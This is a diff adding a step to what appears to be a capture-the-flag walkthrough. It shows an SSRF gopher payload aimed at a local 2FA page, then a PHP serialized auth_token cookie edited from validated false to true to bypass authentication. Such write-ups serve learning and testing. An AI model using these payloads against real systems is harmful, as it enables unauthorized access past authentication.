@@ -219,3 +219,18 @@ http://$TARGET/preview.php?url=gopher://127.0.0.1:80/_GET%2520/management/2fa.ph
 
 ![2fa page](images/23-2fa.png)
 
+24. I wondered Around some time and Finally Cookies caught my eye! `auth_token` seems Like deserialized PHP object! Lets Change `Validated` value to be `true`! ✨
+```
+O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D
+O:9:"AuthToken":1:{s:9:"validated";b:0;}
+```
+
+![cookie before](images/24-before.png)
+
+```
+O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D
+O:9:"AuthToken":1:{s:9:"validated";b:1;}
+```
+
+![cookie after](images/24-after.png)
+
